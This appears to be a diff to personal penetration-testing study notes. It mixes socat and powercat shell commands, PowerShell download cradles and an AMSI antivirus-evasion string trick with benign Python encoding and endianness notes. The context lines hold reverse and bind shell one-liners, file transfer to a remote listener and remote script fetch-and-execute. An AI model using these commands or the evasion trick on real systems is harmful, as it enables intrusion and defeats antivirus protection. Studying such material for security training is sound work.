@@ -335,7 +335,7 @@
 *** socat
     + ~socat [-u|U] TCP-LISTEN:127.0.0.1:1337,fork path/to/file~ //uni-directional mode: U for right to left, u for left to right. Be careful not to override the source file.
     + ~socat tcp-connect:127.0.0.1:1337 exec:/bin/sh,stderr,pty[,setsid,sigint,sane]~ //reverse shell
-    + //misc methods:
+    + @Deprecated //misc methods:
       - ~socat -d -d TCP4-LISTEN:443 STDOUT~ //...but why bother
       - ~socat TCP4:127.0.0.1:443 EXEC:/bin/bash~ //...use the parameterizes
       
@@ -449,13 +449,11 @@
     + ~powershell -c "(new-object System.Net.WebClient).DownloadFile('http://127.0.0.1/wget.exe','./wget.exe')"~
     + ~iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')~ //load the remote script during the session only 
 
-*** powercat //! triggers amsi
+*** @Deprecated ~powercat~ //!triggers amsi
     + ~iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')~ //!triggers amsi
     + ~powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1~ //client mode, port 443, ....ps1 as input(file to be transferred)
     + ~powercat -c 10.11.0.4 -p 443 -e cmd.exe~ //reverse shell...but why bother
     + ~powercat -l -p 443 -e cmd.exe~ //bind shell...but why bother
-
-
 
 *** amsi evasion (//"this script contains malicious content and has been blocked by your antivirus software")
      + $evil_0 = "amsicontext"
@@ -478,6 +476,7 @@
      + $not_evil = "amsiNOTEVIL" -replace "NOTEVIL", "context"
 
 **** TODO use encoding? 
+     + simple base64 encoding now still trigger amsi || Windows virus threat protection
 
 * Book4_Chapter 01 An Introduction to TCP/IP
   
@@ -835,9 +834,10 @@ relay the datagram.
 
 *** encoding and decoding in python
    [[ut#EncodeDecodeAFile.py]]
-   + ~str("こ").encode("utf-8").decode("utf-8")~
-   + ~str("こ").encode("shift-jis").decode("shift-jis")~
-   + //Shift-JIS encoded string, in unsigned ints: ~130 177 130 241 130 201 130 191 130 205~ //こんにちは
+   + ~str("こ").encode("utf-8")~ //<class 'bytes'> b'\xe3\x81\x93' 
+   + ~b'\xe3\x81\x93'.decode("utf-8")~ //<class 'str'> 'こ'
+
+   + ~130 177 130 241 130 201 130 191 130 205~ //Shift-JIS str 'こんにちは'
    + ~chr(99)~ //'c'
    + ~hex(130) + hex(177) + hex(130) + hex(241)~ //"0x820xb10x820xf1"
    + ~b2 = b"\x82\xb1\x82\xf1"~ //b2.__class__ = <bytes>
@@ -850,8 +850,33 @@ relay the datagram.
      o2 = base64.b64decode(o1) # b'cat'
      #+end_src
 
-**** deprecated: codecs
+**** @Deprecated: codecs
    + ~codecs.encode(bytes('こんにちは', 'shift-jis'), encoding="base64")~ //b'grGC8YLJgr+CzQ==\n'
    + ~codecs.decode(b'grGC8YLJgr+CzQ==\n', encoding="base64")~ //b'\x82\xb1\x82\xf1\x82\xc9\x82\xbf\x82\xcd'
    + ~codecs.decode(b'\x82\xb1\x82\xf1\x82\xc9\x82\xbf\x82\xcd', encoding="shift-jis")~ //こんにちは
    + ~codecs.decode(b'grGC8YLJgr+CzQ==\n', encoding="base64").decode("shift-jis")~ //こんにちは
+
+**** *Endianness* the Big-endian(BE) and Little-endian(LE)
+     + BE: *the most significant byte -> smallest memory address.*
+       - //left to right human readable? but reverse
+       - an 32-bit int: 0x0A0B0C0D
+         + (assume byte p* is the starting byte of a memory section)
+         + 0A -> p
+         + 0B -> p + 1
+         + 0C -> p + 2
+         + 0D -> p + 3
+     + LE: *the most significant byte -> biggest memory address.*
+       - //a bigger byte goes to a bigger address
+       - an 32-bit int: 0x0A0B0C0D
+         + (assume byte p* is the starting byte of a memory section)
+         + 0D -> p
+         + 0C -> p + 1
+         + 0B -> p + 2
+         + 0A -> p + 3
+
+***** Endianness in python
+      #+begin_src
+      an_int = 5
+      two_bytes_big = an_int.to_bytes(2,'big') # b'\x00\x05'
+      two_bytes_little = an_int.to_bytes(2,'little') # b'\x05\x00'
+      #+end_src
